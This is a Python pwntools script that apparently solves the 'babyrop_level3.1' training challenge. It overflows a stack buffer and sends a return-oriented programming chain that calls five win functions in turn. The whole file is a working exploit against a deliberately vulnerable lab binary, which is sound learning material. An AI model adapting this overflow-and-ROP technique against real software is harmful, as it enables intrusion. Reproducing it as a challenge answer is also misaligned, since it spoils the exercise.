from pwn import *

context.arch = 'amd64'

elf = ELF('/challenge/babyrop_level3.1')

rop = ROP(elf)
pop_rdi = rop.rdi.address

wins = [0x40223b, 0x402079, 0x402159, 0x4023fa, 0x402317]

for i in range(5):
    rop.raw(pop_rdi)
    rop.raw(i+1)
    rop.raw(wins[i]) # win 

p = process("/challenge/babyrop_level3.1")
payload = b"A" * (0x60 + 8) + rop.chain()
p.send(payload)
print(p.recvall())
p.close()
